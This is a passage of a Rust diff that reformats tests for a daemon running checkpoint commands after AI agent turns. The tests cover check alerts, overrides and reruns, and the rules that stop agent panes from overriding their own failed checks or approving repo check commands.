     d.terms.get_mut(&t).unwrap().status = Status::Done;
     with_check(&mut d, t, CheckState::Failed, "FAIL a");
-    d.command(0, Command::OverrideCheck { term: t, name: None, reason: "r".into() }).unwrap();
-    d.command(0, Command::RerunCheck { term: t, name: None }).unwrap();
+    d.command(
+        0,
+        Command::OverrideCheck {
+            term: t,
+            name: None,
+            reason: "r".into(),
+        },
+    )
+    .unwrap();
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: None,
+        },
+    )
+    .unwrap();
     let running = check_of(&d, t);
-    assert_eq!((running.state, running.overridden_at, running.override_reason.as_str()), (CheckState::Checking, None, ""));
+    assert_eq!(
+        (
+            running.state,
+            running.overridden_at,
+            running.override_reason.as_str()
+        ),
+        (CheckState::Checking, None, "")
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     assert_eq!(check_of(&d, t).state, CheckState::Passed);
-    let kept = d.terms[&t].checks.points.first().and_then(|p| p.overridden.as_ref()).expect("the overridden result is kept");
-    assert_eq!((kept.info.state, kept.output.as_str()), (CheckState::Overridden, "FAIL a"));
+    let kept = d.terms[&t]
+        .checks
+        .points
+        .first()
+        .and_then(|p| p.overridden.as_ref())
+        .expect("the overridden result is kept");
+    assert_eq!(
+        (kept.info.state, kept.output.as_str()),
+        (CheckState::Overridden, "FAIL a")
+    );
     close(&mut d, &[t]);
 }
 
@@ -2305,14 +4355,41 @@ fn a_read_only_pane_may_not_rerun_or_override_another_panes_check() {
     let token = d.terms[&a].token.clone();
     d.handle(Ev::From(7, a, token));
     d.terms.get_mut(&a).unwrap().grants = Some(vec!["read".into()]);
-    for cmd in [Command::RerunCheck { term: b, name: None }, Command::OverrideCheck { term: b, name: None, reason: String::new() }, Command::UndoOverride { term: b, name: None }] {
+    for cmd in [
+        Command::RerunCheck {
+            term: b,
+            name: None,
+        },
+        Command::OverrideCheck {
+            term: b,
+            name: None,
+            reason: String::new(),
+        },
+        Command::UndoOverride {
+            term: b,
+            name: None,
+        },
+    ] {
         d.message(7, ClientMsg::Command(cmd.clone()));
-        assert!(matches!(out.try_recv(), Ok(ServerMsg::Error(_))), "{cmd:?} needs write");
+        assert!(
+            matches!(out.try_recv(), Ok(ServerMsg::Error(_))),
+            "{cmd:?} needs write"
+        );
     }
     assert_eq!(check_of(&d, b).state, CheckState::Failed, "untouched");
     d.terms.get_mut(&a).unwrap().grants = Some(vec!["read".into(), "write".into()]);
-    d.message(7, ClientMsg::Command(Command::OverrideCheck { term: b, name: None, reason: "ok".into() }));
-    assert!(matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Ok))), "write allows it");
+    d.message(
+        7,
+        ClientMsg::Command(Command::OverrideCheck {
+            term: b,
+            name: None,
+            reason: "ok".into(),
+        }),
+    );
+    assert!(
+        matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Ok))),
+        "write allows it"
+    );
     assert_eq!(check_of(&d, b).state, CheckState::Overridden);
     close(&mut d, &[a, b]);
 }
@@ -2326,8 +4403,18 @@ fn a_pane_may_not_override_its_own_check() {
     d.handle(Ev::Connected(7, tx, false));
     let token = d.terms[&a].token.clone();
     d.handle(Ev::From(7, a, token));
-    d.message(7, ClientMsg::Command(Command::OverrideCheck { term: a, name: None, reason: "trust me".into() }));
-    assert!(matches!(out.try_recv(), Ok(ServerMsg::Error(_))), "an agent's claim never counts");
+    d.message(
+        7,
+        ClientMsg::Command(Command::OverrideCheck {
+            term: a,
+            name: None,
+            reason: "trust me".into(),
+        }),
+    );
+    assert!(
+        matches!(out.try_recv(), Ok(ServerMsg::Error(_))),
+        "an agent's claim never counts"
+    );
     assert_eq!(check_of(&d, a).state, CheckState::Failed);
     close(&mut d, &[a]);
 }
@@ -2336,30 +4423,77 @@ fn a_pane_may_not_override_its_own_check() {
 fn only_you_answer_a_repo_check_approval() {
     let (mut d, _rx, _file) = approving_daemon();
     let a = waiting_for_approval(&mut d, "npm test");
-    d.approvals.decide(&std::env::temp_dir(), "build", "make", approvals::Decision::Never, 1);
+    d.approvals.decide(
+        &std::env::temp_dir(),
+        "build",
+        "make",
+        approvals::Decision::Never,
+        1,
+    );
     let kept = d.approvals.clone();
     let (tx, mut out) = mpsc::channel(16);
     d.handle(Ev::Connected(7, tx, false));
     let token = d.terms[&a].token.clone();
     d.handle(Ev::From(7, a, token));
-    d.terms.get_mut(&a).unwrap().grants = Some(["read", "write", "start", "respond", "admin"].map(String::from).into());
-    let forget = Command::ForgetCheckApproval { project: std::env::temp_dir(), name: "build".into() };
-    for cmd in [ApprovalChoice::Once, ApprovalChoice::Always, ApprovalChoice::Never].map(|choice| Command::ApproveCheck { term: a, name: "test".into(), choice, command_sha256: approvals::command_hash("npm test") }).into_iter().chain([forget]) {
+    d.terms.get_mut(&a).unwrap().grants = Some(
+        ["read", "write", "start", "respond", "admin"]
+            .map(String::from)
+            .into(),
+    );
+    let forget = Command::ForgetCheckApproval {
+        project: std::env::temp_dir(),
+        name: "build".into(),
+    };
+    for cmd in [
+        ApprovalChoice::Once,
+        ApprovalChoice::Always,
+        ApprovalChoice::Never,
+    ]
+    .map(|choice| Command::ApproveCheck {
+        term: a,
+        name: "test".into(),
+        choice,
+        command_sha256: approvals::command_hash("npm test"),
+    })
+    .into_iter()
+    .chain([forget])
+    {
         d.message(7, ClientMsg::Command(cmd.clone()));
-        assert!(matches!(out.try_recv(), Ok(ServerMsg::Error(e)) if e.contains("yours")), "{cmd:?}: a pane may not, whatever its grants");
+        assert!(
+            matches!(out.try_recv(), Ok(ServerMsg::Error(e)) if e.contains("yours")),
+            "{cmd:?}: a pane may not, whatever its grants"
+        );
     }
-    assert_eq!(d.approvals.clone().for_run(a), kept.clone().for_run(a), "nothing granted, kept or forgotten");
-    assert_eq!(check_of(&d, a).state, CheckState::NeedsApproval, "and nothing ran");
+    assert_eq!(
+        d.approvals.clone().for_run(a),
+        kept.clone().for_run(a),
+        "nothing granted, kept or forgotten"
+    );
+    assert_eq!(
+        check_of(&d, a).state,
+        CheckState::NeedsApproval,
+        "and nothing ran"
+    );
     close(&mut d, &[a]);
 }
 
 fn checking(d: &mut Daemon, t: TermId) {
-    let info = CheckInfo { name: "test".into(), command: "npm test".into(), state: CheckState::Checking, ..Default::default() };
+    let info = CheckInfo {
+        name: "test".into(),
+        command: "npm test".into(),
+        state: CheckState::Checking,
+        ..Default::default()
+    };
     d.terms.get_mut(&t).unwrap().checks.points = vec![check::CheckRecord::new(info, "").into()];
 }
 
 fn ran(outcome: check::CheckOutcome) -> check::CheckRun {
-    check::CheckRun { outcome, output: String::new(), lines: 0, duration: Duration::from_millis(5) }
+    check::CheckRun {
+        outcome,
+        output: String::new(),
+        lines: 0,
+        duration: Duration::from_millis(5),
+    }
 }
 
 /// The running checkpoint `test` (see `checking`) ends with `outcome`.
@@ -2376,7 +4510,8 @@ fn working_agent(d: &mut Daemon) -> TermId {
 }
 
 fn overdue(d: &mut Daemon, t: TermId) {
-    d.terms.get_mut(&t).unwrap().alert_due.as_mut().unwrap().1 = Instant::now() - Duration::from_millis(1);
+    d.terms.get_mut(&t).unwrap().alert_due.as_mut().unwrap().1 =
+        Instant::now() - Duration::from_millis(1);
 }
 
 fn viewer(d: &mut Daemon) -> mpsc::Receiver<ServerMsg> {
@@ -2397,13 +4532,35 @@ fn a_finished_alert_waits_for_the_check_and_rings_once_it_passes() {
     let mut seen = viewer(&mut d);
     checking(&mut d, t);
     d.set_status(t, Status::Done, "test");
-    assert!(!heard(&mut seen).iter().any(|m| matches!(m, ServerMsg::Attention { status: Status::Done, .. })), "not announced while checking");
+    assert!(
+        !heard(&mut seen).iter().any(|m| matches!(
+            m,
+            ServerMsg::Attention {
+                status: Status::Done,
+                ..
+            }
+        )),
+        "not announced while checking"
+    );
     // Even a deadline that is already due holds back.
-    d.terms.get_mut(&t).unwrap().alert_due = Some((Status::Done, Instant::now() - Duration::from_millis(1)));
+    d.terms.get_mut(&t).unwrap().alert_due =
+        Some((Status::Done, Instant::now() - Duration::from_millis(1)));
     d.settled_alerts();
-    assert!(d.terms[&t].alerted.is_none() && d.terms[&t].alert_due.is_some(), "still held");
+    assert!(
+        d.terms[&t].alerted.is_none() && d.terms[&t].alert_due.is_some(),
+        "still held"
+    );
     check_ends(&mut d, t, check::CheckOutcome::Exited(0));
-    assert!(heard(&mut seen).iter().any(|m| matches!(m, ServerMsg::Attention { status: Status::Done, .. })), "announced once it passed");
+    assert!(
+        heard(&mut seen).iter().any(|m| matches!(
+            m,
+            ServerMsg::Attention {
+                status: Status::Done,
+                ..
+            }
+        )),
+        "announced once it passed"
+    );
     d.clients.clear();
     overdue(&mut d, t);
     d.settled_alerts();
@@ -2420,10 +4577,24 @@ fn a_failed_check_raises_its_own_alert_and_never_a_finished_one() {
     d.set_status(t, Status::Done, "test");
     check_ends(&mut d, t, check::CheckOutcome::Exited(1));
     let got = heard(&mut seen);
-    assert!(got.iter().any(|m| matches!(m, ServerMsg::Attention { term, status: Status::Blocked } if *term == t)));
-    assert!(got.iter().any(|m| matches!(m, ServerMsg::Notice(n) if n.contains("check failed"))));
-    assert!(!got.iter().any(|m| matches!(m, ServerMsg::Attention { status: Status::Done, .. })));
-    assert!(d.terms[&t].alert_due.is_none(), "no finished alert is left to ring");
+    assert!(got.iter().any(
+        |m| matches!(m, ServerMsg::Attention { term, status: Status::Blocked } if *term == t)
+    ));
+    assert!(
+        got.iter()
+            .any(|m| matches!(m, ServerMsg::Notice(n) if n.contains("check failed")))
+    );
+    assert!(!got.iter().any(|m| matches!(
+        m,
+        ServerMsg::Attention {
+            status: Status::Done,
+            ..
+        }
+    )));
+    assert!(
+        d.terms[&t].alert_due.is_none(),
+        "no finished alert is left to ring"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2436,8 +4607,17 @@ fn a_check_that_could_not_run_gives_a_notice_and_the_session_finishes() {
     d.set_status(t, Status::Done, "test");
     check_ends(&mut d, t, check::CheckOutcome::SpawnFailed);
     let got = heard(&mut seen);
-    assert!(got.iter().any(|m| matches!(m, ServerMsg::Notice(n) if n.contains("could not run"))));
-    assert!(got.iter().any(|m| matches!(m, ServerMsg::Attention { status: Status::Done, .. })));
+    assert!(
+        got.iter()
+            .any(|m| matches!(m, ServerMsg::Notice(n) if n.contains("could not run")))
+    );
+    assert!(got.iter().any(|m| matches!(
+        m,
+        ServerMsg::Attention {
+            status: Status::Done,
+            ..
+        }
+    )));
     assert!(d.terms[&t].alert_due.is_some());
     close(&mut d, &[t]);
 }
@@ -2462,7 +4642,13 @@ fn a_session_with_no_check_announces_its_finish_at_once() {
     let t = working_agent(&mut d);
     let mut seen = viewer(&mut d);
     d.set_status(t, Status::Done, "test");
-    assert!(heard(&mut seen).iter().any(|m| matches!(m, ServerMsg::Attention { status: Status::Done, .. })));
+    assert!(heard(&mut seen).iter().any(|m| matches!(
+        m,
+        ServerMsg::Attention {
+            status: Status::Done,
+            ..
+        }
+    )));
     d.clients.clear();
     overdue(&mut d, t);
     d.settled_alerts();
@@ -2470,7 +4656,10 @@ fn a_session_with_no_check_announces_its_finish_at_once() {
     close(&mut d, &[t]);
 }
 
-fn claude_reports(d: &mut Daemon, t: TermId) -> impl FnMut(&mut Daemon, HookStatus, &str, &[&str]) + use<> {
+fn claude_reports(
+    d: &mut Daemon,
+    t: TermId,
+) -> impl FnMut(&mut Daemon, HookStatus, &str, &[&str]) + use<> {
     let secret = d.terms[&t].token.clone();
     move |d: &mut Daemon, status, event: &str, background: &[&str]| {
         let mut msg = report(t, &secret, 0, status, event);
@@ -2492,15 +4681,28 @@ fn a_turn_paused_on_background_work_does_not_ring_finished() {
     let mut seen = viewer(&mut d);
     say(&mut d, HookStatus::Working, "UserPromptSubmit", &[]);
     say(&mut d, HookStatus::Done, "Stop", &["ci-watch"]);
-    assert_eq!(d.terms[&t].status, Status::Done, "Claude itself shows the turn done, with a shell still running");
-    assert!(!announced(&heard(&mut seen), Status::Done), "no finished sound while it waits on its own work");
-    assert!(d.terms[&t].alert_due.is_none(), "no desktop notification queued");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Done,
+        "Claude itself shows the turn done, with a shell still running"
+    );
+    assert!(
+        !announced(&heard(&mut seen), Status::Done),
+        "no finished sound while it waits on its own work"
+    );
+    assert!(
+        d.terms[&t].alert_due.is_none(),
+        "no desktop notification queued"
+    );
     d.phone_alerts();
     assert_eq!(d.terms[&t].phoned, 0, "no phone alert");
     // The shell finished and Claude woke by itself to carry on.
     say(&mut d, HookStatus::Working, "PreToolUse", &[]);
     say(&mut d, HookStatus::Done, "Stop", &[]);
-    assert!(announced(&heard(&mut seen), Status::Done), "the real end of the work rings");
+    assert!(
+        announced(&heard(&mut seen), Status::Done),
+        "the real end of the work rings"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2512,10 +4714,16 @@ fn a_background_task_that_never_ends_does_not_silence_later_turns() {
     let mut seen = viewer(&mut d);
     say(&mut d, HookStatus::Working, "UserPromptSubmit", &[]);
     say(&mut d, HookStatus::Done, "Stop", &["dev-server"]);
-    assert!(!announced(&heard(&mut seen), Status::Done), "the turn that started it is read as paused");
+    assert!(
+        !announced(&heard(&mut seen), Status::Done),
+        "the turn that started it is read as paused"
+    );
     say(&mut d, HookStatus::Working, "UserPromptSubmit", &[]);
     say(&mut d, HookStatus::Done, "Stop", &["dev-server"]);
-    assert!(announced(&heard(&mut seen), Status::Done), "the same server still running doesn't hold the next turn");
+    assert!(
+        announced(&heard(&mut seen), Status::Done),
+        "the same server still running doesn't hold the next turn"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2527,7 +4735,10 @@ fn a_wake_up_with_an_older_task_still_running_rings() {
     let mut seen = viewer(&mut d);
     say(&mut d, HookStatus::Working, "UserPromptSubmit", &[]);
     say(&mut d, HookStatus::Done, "Stop", &["b1", "b2"]);
-    assert!(!announced(&heard(&mut seen), Status::Done), "both are new: paused");
+    assert!(
+        !announced(&heard(&mut seen), Status::Done),
+        "both are new: paused"
+    );
     // b1 ended and woke it; b2 was already running at the last stop.
     say(&mut d, HookStatus::Working, "PreToolUse", &[]);
     say(&mut d, HookStatus::Done, "Stop", &["b2"]);
@@ -2543,10 +4754,17 @@ fn a_paused_turn_is_checked_only_when_the_work_really_ends() {
     say(&mut d, HookStatus::Working, "UserPromptSubmit", &[]);
     let before = d.terms[&t].checks.turn;
     say(&mut d, HookStatus::Done, "Stop", &["ci-watch"]);
-    assert_eq!(d.terms[&t].checks.turn, before, "no check while it waits on its own work");
+    assert_eq!(
+        d.terms[&t].checks.turn, before,
+        "no check while it waits on its own work"
+    );
     say(&mut d, HookStatus::Working, "PreToolUse", &[]);
     say(&mut d, HookStatus::Done, "Stop", &[]);
-    assert_eq!(d.terms[&t].checks.turn, before + 1, "checked at the real end");
+    assert_eq!(
+        d.terms[&t].checks.turn,
+        before + 1,
+        "checked at the real end"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2559,7 +4777,10 @@ fn working_again_by_any_route_ends_the_pause() {
     say(&mut d, HookStatus::Done, "Stop", &["helper"]);
     assert!(d.terms[&t].awaiting_background);
     d.set_status(t, Status::Working, "one of its own agents is still running");
-    assert!(!d.terms[&t].awaiting_background, "a later finish is news again");
+    assert!(
+        !d.terms[&t].awaiting_background,
+        "a later finish is news again"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2592,7 +4813,10 @@ fn a_wake_up_that_only_talks_still_rings_when_it_ends() {
     assert!(!announced(&heard(&mut seen), Status::Done));
     // A wake-up turn with no tool call sends no working report before its stop.
     say(&mut d, HookStatus::Done, "Stop", &[]);
-    assert!(announced(&heard(&mut seen), Status::Done), "finished once nothing is left in flight");
+    assert!(
+        announced(&heard(&mut seen), Status::Done),
+        "finished once nothing is left in flight"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2617,23 +4841,42 @@ fn the_phone_hears_nothing_while_a_check_runs_or_after_it_fails() {
 fn a_queued_follow_up_still_sends_when_the_turn_ends_during_a_check() {
     let (mut d, _rx) = daemon();
     let t = working_agent(&mut d);
-    d.terms.get_mut(&t).unwrap().queue.push_back("and the docs".into());
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .queue
+        .push_back("and the docs".into());
     checking(&mut d, t);
     d.set_status(t, Status::Done, "test");
     d.update_statuses();
-    assert!(d.terms[&t].queue.is_empty() && d.terms[&t].queue_sent.is_some(), "sent as today");
+    assert!(
+        d.terms[&t].queue.is_empty() && d.terms[&t].queue_sent.is_some(),
+        "sent as today"
+    );
     close(&mut d, &[t]);
 }
 
 // ---- several checkpoints and stale passes ---------------------------------------------
 
 fn checkpoint_def(project: &std::path::Path, name: &str, command: &str) -> crate::config::CheckDef {
-    crate::config::CheckDef { project: project.to_path_buf(), name: Some(name.into()), command: command.into(), timeout_s: LONG_CHECK_S }
+    crate::config::CheckDef {
+        project: project.to_path_buf(),
+        name: Some(name.into()),
+        command: command.into(),
+        timeout_s: LONG_CHECK_S,
+    }
 }
 
 /// An agent at work in `dir`, whose project names checkpoints `(name, command)` in order.
-fn agent_with_checkpoints(d: &mut Daemon, dir: &std::path::Path, points: &[(&str, &str)]) -> TermId {
-    d.cfg.check = points.iter().map(|(name, command)| checkpoint_def(dir, name, command)).collect();
+fn agent_with_checkpoints(
+    d: &mut Daemon,
+    dir: &std::path::Path,
+    points: &[(&str, &str)],
+) -> TermId {
+    d.cfg.check = points
+        .iter()
+        .map(|(name, command)| checkpoint_def(dir, name, command))
+        .collect();
     let t = d.spawn(None, dir, 80, 24).expect("a shell pane");
     let p = d.terms.get_mut(&t).unwrap();
     (p.agent, p.hooked, p.status) = (Some("claude".into()), true, Status::Working);
@@ -2668,7 +4911,12 @@ fn look_for_repo_checks(d: &mut Daemon, rx: &mut mpsc::Receiver<Ev>, t: TermId) 
 }
 
 fn states(d: &Daemon, t: TermId) -> Vec<(String, CheckState)> {
-    d.terms[&t].checks.points.iter().map(|p| (p.latest.info.name.clone(), p.latest.info.state)).collect()
+    d.terms[&t]
+        .checks
+        .points
+        .iter()
+        .map(|p| (p.latest.info.name.clone(), p.latest.info.state))
+        .collect()
 }
 
 fn named_states(pairs: &[(&str, CheckState)]) -> Vec<(String, CheckState)> {
@@ -2676,33 +4924,73 @@ fn named_states(pairs: &[(&str, CheckState)]) -> Vec<(String, CheckState)> {
 }
 
 fn point(d: &Daemon, t: TermId, name: &str) -> CheckInfo {
-    d.terms[&t].checks.named(name).expect("the checkpoint").latest.info.clone()
+    d.terms[&t]
+        .checks
+        .named(name)
+        .expect("the checkpoint")
+        .latest
+        .info
+        .clone()
 }
 
 fn announced(seen: &[ServerMsg], status: Status) -> bool {
-    seen.iter().any(|m| matches!(m, ServerMsg::Attention { status: s, .. } if *s == status))
+    seen.iter()
+        .any(|m| matches!(m, ServerMsg::Attention { status: s, .. } if *s == status))
 }
 
 fn noticed(seen: &[ServerMsg], text: &str) -> usize {
-    seen.iter().filter(|m| matches!(m, ServerMsg::Notice(n) if n.contains(text))).count()
+    seen.iter()
+        .filter(|m| matches!(m, ServerMsg::Notice(n) if n.contains(text)))
+        .count()
 }
 
 #[test]
 fn two_checkpoints_that_pass_run_in_order_and_finish_the_turn() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let t = agent_with_checkpoints(&mut d, &std::env::temp_dir(), &[("build", "echo built; exit 0"), ("test", "echo tested; exit 0")]);
+    let t = agent_with_checkpoints(
+        &mut d,
+        &std::env::temp_dir(),
+        &[
+            ("build", "echo built; exit 0"),
+            ("test", "echo tested; exit 0"),
+        ],
+    );
     let mut seen = viewer(&mut d);
     end_turn(&mut d, t);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Checking), ("test", CheckState::Pending)]));
-    assert!(!announced(&heard(&mut seen), Status::Done), "held while they run");
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Checking),
+            ("test", CheckState::Pending)
+        ])
+    );
+    assert!(
+        !announced(&heard(&mut seen), Status::Done),
+        "held while they run"
+    );
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Passed), ("test", CheckState::Passed)]));
-    assert!(announced(&heard(&mut seen), Status::Done), "done once both passed");
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("build", CheckState::Passed), ("test", CheckState::Passed)])
+    );
+    assert!(
+        announced(&heard(&mut seen), Status::Done),
+        "done once both passed"
+    );
     let test = point(&d, t, "test");
-    assert_eq!((test.turn, test.cwd.as_path(), test.line_count), (1, std::env::temp_dir().as_path(), 1));
-    assert_eq!(d.check_output(t, Some("test")).map(str::trim), Some("tested"));
-    assert_eq!(d.check_output(t, Some("build")).map(str::trim), Some("built"));
+    assert_eq!(
+        (test.turn, test.cwd.as_path(), test.line_count),
+        (1, std::env::temp_dir().as_path(), 1)
+    );
+    assert_eq!(
+        d.check_output(t, Some("test")).map(str::trim),
+        Some("tested")
+    );
+    assert_eq!(
+        d.check_output(t, Some("build")).map(str::trim),
+        Some("built")
+    );
     assert_eq!(d.snapshot().terms[&t].checks.len(), 2, "clients see both");
     close(&mut d, &[t]);
 }
@@ -2711,26 +4999,56 @@ fn two_checkpoints_that_pass_run_in_order_and_finish_the_turn() {
 fn a_failed_checkpoint_does_not_stop_the_next_and_the_turn_reads_failed() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let t = agent_with_checkpoints(&mut d, &std::env::temp_dir(), &[("build", "echo \"FAIL build\"; exit 2"), ("test", "echo tested; exit 0")]);
+    let t = agent_with_checkpoints(
+        &mut d,
+        &std::env::temp_dir(),
+        &[
+            ("build", "echo \"FAIL build\"; exit 2"),
+            ("test", "echo tested; exit 0"),
+        ],
+    );
     let mut seen = viewer(&mut d);
     end_turn(&mut d, t);
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Failed), ("test", CheckState::Passed)]));
-    assert_eq!((point(&d, t, "build").exit_code, point(&d, t, "build").first_failing_line.as_str()), (Some(2), "FAIL build"));
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("build", CheckState::Failed), ("test", CheckState::Passed)])
+    );
+    assert_eq!(
+        (
+            point(&d, t, "build").exit_code,
+            point(&d, t, "build").first_failing_line.as_str()
+        ),
+        (Some(2), "FAIL build")
+    );
     let got = heard(&mut seen);
-    assert!(announced(&got, Status::Blocked) && !announced(&got, Status::Done), "a failure, never a finish");
+    assert!(
+        announced(&got, Status::Blocked) && !announced(&got, Status::Done),
+        "a failure, never a finish"
+    );
     assert_eq!(noticed(&got, "check failed"), 1);
-    assert_eq!(d.snapshot().terms[&t].check().map(|c| c.name.as_str()), Some("build"), "the failure is the headline");
+    assert_eq!(
+        d.snapshot().terms[&t].check().map(|c| c.name.as_str()),
+        Some("build"),
+        "the failure is the headline"
+    );
     assert!(d.terms[&t].check_holds_done());
     close(&mut d, &[t]);
 }
 
 /// `build` runs; `test` waits for your approval of a changed command; `lint` you said never to.
-fn gated(user: &[crate::config::CheckDef], project: &std::path::Path, worktree: &std::path::Path, approvals: &approvals::Approvals) -> Vec<check_source::Resolved> {
+fn gated(
+    user: &[crate::config::CheckDef],
+    project: &std::path::Path,
+    worktree: &std::path::Path,
+    approvals: &approvals::Approvals,
+) -> Vec<check_source::Resolved> {
     let mut all = check_source::resolve(user, project, worktree, approvals);
     for r in &mut all {
         r.gate = match r.def.name() {
-            "test" => check_source::Gate::NeedsApproval { previous: Some("npm t".into()) },
+            "test" => check_source::Gate::NeedsApproval {
+                previous: Some("npm t".into()),
+            },
             "lint" => check_source::Gate::Never,
             _ => check_source::Gate::Run,
         };
@@ -2738,7 +5056,12 @@ fn gated(user: &[crate::config::CheckDef], project: &std::path::Path, worktree: 
     all
 }
 
-fn never_any(user: &[crate::config::CheckDef], project: &std::path::Path, worktree: &std::path::Path, approvals: &approvals::Approvals) -> Vec<check_source::Resolved> {
+fn never_any(
+    user: &[crate::config::CheckDef],
+    project: &std::path::Path,
+    worktree: &std::path::Path,
+    approvals: &approvals::Approvals,
+) -> Vec<check_source::Resolved> {
     let mut all = check_source::resolve(user, project, worktree, approvals);
     for r in &mut all {
         r.gate = check_source::Gate::Never;
@@ -2751,22 +5074,47 @@ fn a_checkpoint_waiting_for_approval_is_not_run_and_asks_for_you_once_a_turn() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
     d.resolver = gated;
-    let points = [("build", "echo built; exit 0"), ("test", "npm test"), ("lint", "npm run lint")];
+    let points = [
+        ("build", "echo built; exit 0"),
+        ("test", "npm test"),
+        ("lint", "npm run lint"),
+    ];
     let t = agent_with_checkpoints(&mut d, &std::env::temp_dir(), &points);
     let mut seen = viewer(&mut d);
     end_turn(&mut d, t);
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Passed), ("test", CheckState::NeedsApproval), ("lint", CheckState::Never)]));
-    assert_eq!(point(&d, t, "test").previous_command.as_deref(), Some("npm t"));
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Passed),
+            ("test", CheckState::NeedsApproval),
+            ("lint", CheckState::Never)
+        ])
+    );
+    assert_eq!(
+        point(&d, t, "test").previous_command.as_deref(),
+        Some("npm t")
+    );
     assert_eq!(d.check_output(t, Some("test")), Some(""), "it never ran");
     let got = heard(&mut seen);
     assert!(announced(&got, Status::Blocked) && !announced(&got, Status::Done));
     assert_eq!(noticed(&got, "approve check: npm test"), 1);
     assert!(d.terms[&t].check_holds_done(), "not done until you decide");
     d.terms.get_mut(&t).unwrap().status = Status::Done;
-    d.command(0, Command::RerunCheck { term: t, name: Some("build".into()) }).unwrap();
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: Some("build".into()),
+        },
+    )
+    .unwrap();
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(noticed(&heard(&mut seen), "approve check"), 0, "said once a turn");
+    assert_eq!(
+        noticed(&heard(&mut seen), "approve check"),
+        0,
+        "said once a turn"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2790,17 +5138,54 @@ fn a_checkpoint_you_said_never_to_is_not_run_and_the_turn_finishes() {
 fn a_rerun_by_name_runs_only_that_checkpoint() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let t = agent_with_checkpoints(&mut d, &std::env::temp_dir(), &[("build", "echo built; exit 0"), ("test", "echo tested; exit 0")]);
+    let t = agent_with_checkpoints(
+        &mut d,
+        &std::env::temp_dir(),
+        &[
+            ("build", "echo built; exit 0"),
+            ("test", "echo tested; exit 0"),
+        ],
+    );
     end_turn(&mut d, t);
     finish_run(&mut d, &mut rx, t);
     let build = point(&d, t, "build");
-    assert!(d.command(0, Command::RerunCheck { term: t, name: Some("lint".into()) }).is_err(), "no such checkpoint");
-    d.command(0, Command::RerunCheck { term: t, name: Some("test".into()) }).unwrap();
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Passed), ("test", CheckState::Checking)]));
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: Some("lint".into())
+            }
+        )
+        .is_err(),
+        "no such checkpoint"
+    );
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: Some("test".into()),
+        },
+    )
+    .unwrap();
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Passed),
+            ("test", CheckState::Checking)
+        ])
+    );
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Passed), ("test", CheckState::Passed)]));
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("build", CheckState::Passed), ("test", CheckState::Passed)])
+    );
     assert_eq!(point(&d, t, "build"), build, "the other is left as it was");
-    assert_eq!(point(&d, t, "test").turn, 1, "a re-run checks the same turn");
+    assert_eq!(
+        point(&d, t, "test").turn,
+        1,
+        "a re-run checks the same turn"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2808,11 +5193,29 @@ fn a_rerun_by_name_runs_only_that_checkpoint() {
 fn an_override_by_name_acts_on_that_checkpoint_and_says_who() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let t = agent_with_checkpoints(&mut d, &std::env::temp_dir(), &[("build", "exit 1"), ("test", "exit 1")]);
+    let t = agent_with_checkpoints(
+        &mut d,
+        &std::env::temp_dir(),
+        &[("build", "exit 1"), ("test", "exit 1")],
+    );
     end_turn(&mut d, t);
     finish_run(&mut d, &mut rx, t);
-    d.command(0, Command::OverrideCheck { term: t, name: Some("test".into()), reason: "flaky".into() }).unwrap();
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Failed), ("test", CheckState::Overridden)]));
+    d.command(
+        0,
+        Command::OverrideCheck {
+            term: t,
+            name: Some("test".into()),
+            reason: "flaky".into(),
+        },
+    )
+    .unwrap();
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Failed),
+            ("test", CheckState::Overridden)
+        ])
+    );
     assert_eq!(point(&d, t, "test").overridden_by, "you");
     let reviewer = pane(&mut d);
     d.terms.get_mut(&reviewer).unwrap().label = "reviewer".into();
@@ -2821,11 +5224,35 @@ fn an_override_by_name_acts_on_that_checkpoint_and_says_who() {
     d.handle(Ev::Connected(7, tx, false));
     let token = d.terms[&reviewer].token.clone();
     d.handle(Ev::From(7, reviewer, token));
-    d.message(7, ClientMsg::Command(Command::OverrideCheck { term: t, name: None, reason: String::new() }));
+    d.message(
+        7,
+        ClientMsg::Command(Command::OverrideCheck {
+            term: t,
+            name: None,
+            reason: String::new(),
+        }),
+    );
